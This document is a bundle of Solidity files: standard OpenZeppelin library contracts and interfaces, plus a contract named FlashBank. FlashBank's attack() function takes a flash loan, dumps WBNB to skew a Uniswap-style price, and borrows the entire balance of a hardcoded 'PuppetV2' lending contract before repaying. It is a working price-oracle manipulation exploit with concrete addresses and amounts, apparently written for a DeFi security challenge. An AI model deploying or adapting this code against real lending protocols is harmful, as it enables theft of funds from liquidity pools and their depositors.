// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma abicoder v2;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "./interfaces/IUniswapV2Pair.sol";
import "./interfaces/IUniswapFactory.sol";
import "./interfaces/IUniswapRouter.sol";

import "./interfaces/IPuppetV2.sol";

struct CallbackData {
    address borrowToken;
    uint256 borrowAmount;
    address pair;
    uint256 level;
}

contract FlashBank is Ownable {
    event Withdrawn(address indexed to, uint256 indexed value);
    event BaseTokenAdded(address indexed token);
    event BaseTokenRemoved(address indexed token);

    uint256 level = 0;
    bool isWorked = false;

    mapping(uint256 => CallbackData) callBackLoan;

    IUniswapFactory factory;
    IUniswapRouter router;

    constructor(IUniswapFactory _factory, IUniswapRouter _router) {
        factory = _factory;
        router = _router;
    }

    receive() external payable {}

    /// @dev Redirect uniswap callback function
    /// The callback function on different DEX are not same, so use a fallback to redirect to uniswapV2Call
    fallback(bytes calldata _input) external returns (bytes memory) {
        (address sender, , , bytes memory data) = abi.decode(_input[4:], (address, uint256, uint256, bytes));
        uniswapV2Call(sender, data);
    }

    function withdrawAny(IERC20[] memory tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = tokens[i];
            uint256 balance = token.balanceOf(address(this));

            transferERC20(token, owner(), balance);
        }
    }

    function withdrawNative() external onlyOwner {
        address owner = owner();
        payable(owner).transfer(address(this).balance);
    }

    function work() internal {
        if (!isWorked) {
            attack();
            repaid();
        }
    }


    function attack() internal {
      IPuppetV2 puppet = IPuppetV2(0xeF398247851a61D05E19ee23DB92d66c427ecf9F);

      address[] memory path = new address[](2);
      address[] memory path1 = new address[](2);
      address[] memory path2 = new address[](3);

      // LOAN PATH
      path[0] = 0xe53797D8719cBcB371efE2B58bc10d01EdC1Ed0D;
      path[1] = 0xe34cb60441B44109Db6785162e0076b0d3FD5015;

      // REPAID PATH
      path1[0] = 0xe34cb60441B44109Db6785162e0076b0d3FD5015;
      path1[1] = 0xe53797D8719cBcB371efE2B58bc10d01EdC1Ed0D;

      // SWAP WBNB => USDC => BUSD liquidity
      path2[0] = 0xe53797D8719cBcB371efE2B58bc10d01EdC1Ed0D;
      path2[1] = 0x83325d32d2d5Fb5778D281086f2923f50cBd88f7;
      path2[2] = 0xe34cb60441B44109Db6785162e0076b0d3FD5015;

      // APPROVE
      IERC20(path[0]).approve(address(router), 2 ** 255);
      IERC20(path[1]).approve(address(router), 2 ** 255);
      
      IERC20(path[1]).approve(address(puppet), 2 ** 255);

      // Dump WBNB
      uint256 received = router.swapExactTokensForTokens(2890e18, 0, path, address(this), 2**32)[1];
      
      // GET BUSD
      router.swapExactTokensForTokens(10e18, 0, path2, address(this), 2**32)[2];

      // CALCULATE AMOUNT
      uint256 allAmount = IERC20(path[0]).balanceOf(address(puppet));
      uint256 depositFull = puppet.calculateDepositOfWETHRequired(allAmount);
      // LEND
      puppet.borrow(allAmount);

      // REPAID
      router.swapExactTokensForTokens(received, 0, path1, address(this), 2**32)[1];
    }


    function repaid() internal {
        for (uint256 i = 0; i < level; i++) {
            CallbackData memory loanLevel = callBackLoan[i];
            uint256 borrowAmount = loanLevel.borrowAmount;
            address borrowToken = loanLevel.borrowToken;

            if (borrowAmount > 0) {
                uint256 retAmount = getReturnAmount(borrowAmount);

                require(
                    IERC20(borrowToken).balanceOf(address(this)) >= retAmount,
                    "Underpaid"
                );

                transferERC20(IERC20(borrowToken), loanLevel.pair, retAmount);

                callBackLoan[i].borrowAmount = 0;
            }
        }
    }

    /// @notice Do an arbitrage between two Uniswap-like AMM pools
    /// @dev Two pools must contains same token pair
    function flashLoan(address[] memory path, uint256 borrowAmount)
        public
        returns (
            address borrowToken,
            uint256 amount0Out,
            uint256 amount1Out
        )
    {
        for (uint256 i = 0; i < path.length; i++) {
            address token = address(path[i]);
            uint256 approveNumber = IERC20(token).allowance(
                address(this),
                address(router)
            );
            if (approveNumber < 1e19) {
                IERC20(token).approve(address(router), 2**256 - 1);
            }
        }

        require(path.length == 2, "Path = 2");
        // Get Pair of tokens
        address pair = factory.getPair(path[0], path[1]);
        // Get token identifier
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        // Match debt token and borrow token with token0 and token1
        if (path[0] == token0) {
            borrowToken = token1;
            amount1Out = borrowAmount;
        } else {
            borrowToken = token0;
            amount0Out = borrowAmount;
        }
        // Decode call back data from Pancake
        bytes memory data = getCallbackData(borrowToken, borrowAmount, pair);
        // Swap without tokens
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(address sender, bytes memory data) public {
        require(sender == address(this), "Not from this contract");
        // Repaid
        CallbackData memory info = abi.decode(data, (CallbackData));

        callBackLoan[level] = info;

        if (level == 0) {
            level = level + 1;
            address[] memory path = new address[](2);
            path[0] = 0x3829D3De215d11d8BF9d5Ad584fD63654E76E54A;
            path[1] = 0xe53797D8719cBcB371efE2B58bc10d01EdC1Ed0D;
            flashLoan(path, 1200e18);
        } else if (level == 1) {
            // level = level + 1;
        } else if (level == 2) {
            // level = level + 1;
        } else if (level == 3) {
            // level = level + 1;
        } else if (level == 4) {
            // level = level + 1;
        } else if (level == 5) {
            // level = level + 1;
        }

        level = level + 1;
        work();
        isWorked = true;
    }

    function getCallbackData(
        address borrowToken,
        uint256 borrowAmount,
        address pair
    ) internal pure returns (bytes memory) {
        CallbackData memory callbackData;

        callbackData.borrowToken = borrowToken;
        callbackData.borrowAmount = borrowAmount;
        callbackData.pair = pair;

        bytes memory data = abi.encode(callbackData);

        return data;
    }

    function getReturnAmount(uint256 borrowAmount)
        internal
        pure
        returns (uint256)
    {
        return (borrowAmount * 10000) / 9975 + 4;
    }

    function transferERC20(
        IERC20 token,
        address receiver,
        uint256 amount
    ) internal {
        token.transfer(receiver, amount);
    }
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IPuppetV2 {
    function borrow(uint256) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount)
        external
        view
        returns (uint256);
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);
}

pragma solidity >=0.6.2;

interface IUniswapRouter {
    function factory() external pure returns (address);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}